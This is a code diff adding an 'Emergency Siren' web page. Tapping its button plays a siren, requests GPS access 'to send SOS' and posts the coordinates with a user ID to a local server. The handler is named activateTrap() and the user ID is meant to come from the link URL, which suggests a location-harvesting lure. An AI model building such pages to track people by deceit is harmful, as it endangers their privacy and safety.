@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🚨 EMERGENCY SIREN 🚨</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+        .siren-btn {
+            background-color: red;
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+            padding: 30px 50px;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 0 20px red;
+            animation: pulse 1s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); box-shadow: 0 0 20px red; }
+            50% { transform: scale(1.05); box-shadow: 0 0 40px red; }
+            100% { transform: scale(1); box-shadow: 0 0 20px red; }
+        }
+    </style>
+</head>
+<body>
+
+    <h1 id="statusText">TAP BUTTON TO ACTIVATE POLICE SIREN</h1>
+    <p>Please click "Allow" if the browser asks for location access to send SOS.</p>
+    
+    <!-- Yahan Siren ka audio link dalna padega (abhi demo link hai) -->
+    <audio id="sirenAudio" loop>
+        <source src="https://www.soundjay.com/misc/sounds/police-siren-01.mp3" type="audio/mpeg">
+    </audio>
+
+    <button class="siren-btn" onclick="activateTrap()">🚨 ACTIVATE SIREN 🚨</button>
+
+    <script>
+        function activateTrap() {
+            // 1. Play loud siren
+            document.getElementById("sirenAudio").play();
+            document.getElementById("statusText").innerText = "SIREN ACTIVATED! SENDING SOS...";
+            document.getElementById("statusText").style.color = "red";
+
+            // 2. Ask for GPS Location
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocationToBackend, showError);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function sendLocationToBackend(position) {
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+            
+            // Dummy user_id (In real life, URL parameter se aayega like ?user_id=12345)
+            const payload = {
+                user_id: "demo_user_001", 
+                latitude: lat,
+                longitude: lng
+            };
+
+            // 3. Send data to our Python FastAPI server
+            // Note: Abhi hum http://127.0.0.1:8000 use kar rahe hain local testing ke liye
+           // Change 8000 to 8080 here
+fetch("http://127.0.0.1:8080/sos-location",  {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => response.json())
+            .then(data => console.log("Success:", data))
+            .catch((error) => console.error("Error:", error));
+        }
+
+        function showError(error) {
+            console.log("Error getting location: ", error.message);
+        }
+    </script>
+</body>
+</html>
